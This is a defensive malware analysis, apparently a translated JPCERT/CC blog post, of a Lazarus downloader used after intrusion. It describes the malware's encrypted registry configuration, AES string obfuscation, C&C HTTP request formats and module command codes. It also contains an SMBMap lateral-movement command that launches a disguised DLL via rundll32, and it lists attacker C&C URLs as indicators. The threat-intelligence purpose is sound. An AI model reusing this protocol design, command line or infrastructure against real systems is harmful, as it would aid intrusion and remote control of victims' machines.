Different types of malware are used during and after the\nintrusion. This article introduces one of the types of malware used after the intrusion.\n\n### Malware Overview\n\nThis malware downloads and executes modules. It is saved as a .drv file in a folder such as\nC:¥Windows¥System32¥ and run as a service. It is obfuscated by using VMProtect. The file\nhas some unnecessary data at the end, which increases the file size up to about 150MB.\nFigure 1 shows the flow of events until the malware runs.\n\nFigure 1: Malware\n\nbehaviour\n\n\n-----\n\nThe following sections will explain the details of the malware as to configuration,\ncommunication format and modules.\n\n### Configuration\n\nThe configuration of the malware (size: 0x6DE) is encrypted and stored in a registry entry\nand loaded when executed. In this analysis, it was confirmed that the configuration is stored\nat the following directory:\n```\nKey: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\eventlog\\Application\nValue: Emulate\n\n```\nFigure 2 is an example of decoded configuration. It contains an encryption key as well as\nC&C server information. (Please see Appendix A for details.)\n\nFigure 2: Example of configuration\n\n### Obfuscation\n\nAll strings in the malware are encrypted with AES128. The encryption key is hardcoded in\nthe malware. Figure 3 is an example of an encryption key. Since the malware converts the\n16-letter string to wide character (32 bytes), only the first 16 bytes is used as a key.\n\n\n-----\n\nFigure 3: Example of\n\nAES encryption key\nWindows API name is also AES-encrypted. After decrypting API strings, the address for the\nAPIs that are called by LoadLibrary and GetProcAddress are resolved.\n\nFigure 4: Windows API obfuscation\n\n### C&C server communication\n\nBelow is an example of HTTP POST request that the malware first sends.\n```\nPOST /[Path] HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nCookie: token=[a 4-digit random value][a 4-digit authentication key][times of\ncommunication]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/70.0.3538.77 Safari/537.36\nContent-Length: [Size]\nHost:[Server]\n[param]=[Base64 data]\n\n```\n\n-----\n\nThe parameter ([param]) for the POST data is randomly selected from the following.\n```\ntname;blogdata;content;thesis;method;bbs;level;maincode;tab;idx;tb;isbn;entry;doc;cate\n\n```\nThe value in the POST data is Base64-encoded string of the following data.\n```\n[default AES Key]@[Unique ID]\n\n```\nIf a value which is identical to the “4-digit authentication key” in the Cookie (Base64encoded) is returned as a response from a C&C server, the malware sends the following\ninformation.\nAfter the second communication, the malware sends the following HTTP POST request.\n```\nPOST /[Path] HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/70.0.3538.77 Safari/537.36\nContent-Length: [Size]\nHost: [Server]\nCookie: token=[numeric value]; JSESSIONID=[Session ID]\n[param]=[Data1 (Base64 + AES)][Data2 (Base64 + AES)]\n\n```\nThe parameter for the POST data is randomly selected from the aforementioned list. The\nPOST data contains two pieces of information. \"Data1\" contains commands while \"Data2\"\nindicates the result of command execution and other additional data. (Please see Table B-1\nand B-2 in Appendix B for details.)\nThe format of the response data is same as the request except that it lacks parameter. The\nresponse data is AES-encrypted and then Base64-encoded as in the POST data. The\ndifference is that the “+” sign is replaced by a space.\n\nFigure 5 is a flow of communication from the beginning of its communication with a C&C\nserver until downloading a module. In the second communication, the malware sends a new\nAES key, which encrypts the communication that follows.\n\n\n-----\n\nFigure 5: Malware\n\ncommunication flow\nAt the third communication, a module is downloaded. Below is an example of response from\na C&C server when downloading a module.\n```\nHTTP/1.1 200 OK\nDate: Tue, 25 Jun 2020 21:30:42 GMT\nServer: Apache/2.4.26 (Unix) OpenSSL/1.0.1\nContent-Encoding: ISO-8859-1\nContent-Type: text/html;charset=ISO-8859-1\nAccess-Control-Allow-Origin: *\nKeep-Alive: timeout=5, max=98\nConnection: Keep-Alive\nTransfer-Encoding: chunked\n1ff8\n85RR0p8Pq3VfTrSugxgO2Q==Bjpj4qAKXKypb9JFS8IVYleb2P8vp9axDdXCBd…\n\n### Downloaded module\n\n```\nAfter a module is successfully downloaded, it performs the main functions such as receiving\ncommands from the C&C server. (Information including C&C servers and an encryption key\nare provided by malware as an argument.) The downloaded module is UPX-encrypted as in\nFigure 6.\n\n\n-----\n\nFigure 6: Downloaded module decoded\n\nThe communication is performed in the mostly same format as mentioned earlier. It is\nconfirmed that the module offers multiple functions including the following: (See Appendix C\nfor details.)\n\nOperation on files (create a list, delete, copy, modify time created)\nOperation on processes (create a list, execute, kill)\nUpload/download files\nCreate and upload a ZIP file of arbitrary directory\nExecute arbitrary shell command\nObtain disk information\nModify system time\n\n### Lateral movement\n\nFor the purpose of lateral movement, SMBMap[1], a Python tool which allows access to\nremote host via SMB, was used after converting it as a Windows PE file with Pyinstaller.\nAttackers spread infection laterally by leveraging account information which they had\nobtained beforehand.\n```\n[File_Name].exe -u USERID -p PASSWORD=[password] -H [IP_Address] -x\n\"c:\\windows\\system32rundll32.exe C:\\ProgramData\\iconcache.db,CryptGun [AES Key]\"\n\n### In closing\n\n```\nActivities by Lazarus have been reported by many different organisations, and attacks are\nobserved in multiple countries. It is possible that similar cases continue to be observed in\nJapan as well.\n\nC&C server information of the samples mentioned in the article are listed in Appendix D.\nPlease make sure that none of your device is communicating with these hosts.\n\n\n-----\n\nShusei Tomonaga\n(Translated by Yukako Uchida)\n\n**Reference**\n\n[1] GitHub: SMBMap\n\n[https://github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap)\n\n**Appendix A: Configuration**\n\nTable A: List of configuration\n\nOffset Description Remarks\n\n0x000 Number of C&C servers Up to 5\n\n0x004 C&C server 1\n\n0x104 C&C server 2\n\n0x204 C&C server 3\n\n0x304 C&C server 4\n\n0x404 C&C server 5\n\n0x504 Not assigned Contains \"cmd.exe\"\n\n0x604 Operation time\n\n0x616 Sleep time\n\n0x626 Version information Contains \"x64_1.0\"\n\n0x676 Flag for unique ID\n\n0x67A Unique ID Creates a unique value based on the computer name\n\n0x6B6 AES Key\n\n**Appendix B: Contents of data exchanged**\n\nTable B-1: Data1 format (decrypted)\n\nOffset Length Contents\n\n0x00 4 Data1 size\n\n0x04 2 Random data\n\n\n-----\n\n0x06 2 Command\n\n0x08 4 Data2 size\n\n0x0C 2 Random or additional command\n\nTable B-2: Data2 format (decrypted)\n\nOffset Length Contents\n\n0x00 4 Data2 size\n\n0x04 - Data (depends on the command)\n\n**Appendix C: Commands**\n\nTable C: List of commands\n\nValue Contents\n\n0xABCF Get current directory\n\n0xABD5 Get file list\n\n0xABD7 Get process list\n\n0xABD9 Kill process\n\n0xABDB Execute process\n\n0xABDD Execute process (CreateProcessAsUser)\n\n0xABE1 Download file\n\n0xABE3 Upload file\n\n0xABE9 Upload files (create a ZIP)\n\n0xABEB Modify file creation time (timestomp)\n\n0xABED Change local time\n\n0xABF5 Delete file (sdelete)\n\n0xABF7 Execute shell command\n\n0xABF9 Check connection\n\n0xAC03 \n\n-----\n\n0xAC05 \n0xAC07 Change C&C server\n\n0xAC0D Get disk/file information\n\n0xAC15 Change current directory\n\n0xAC17 \n0xAC19 Get load process information\n\n0xAC27 Copy file\n\n**Appendix D: C&C server**\n\nhttps://gestao.simtelecomrs.com.br/sac/digital/client.jsp\nhttps://sac.onecenter.com.br/sac/masks/wfr_masks.jsp\nhttps://mk.bital.com.br/sac/Formule/Manager.jsp\n\n[Email](http://10.10.0.46/mailto:?subject=Malware%20Used%20by%20Lazarus%20after%20Network%20Intrusion&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2020%2F08%2FLazarus-malware.html)\n\nAuthor\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks.
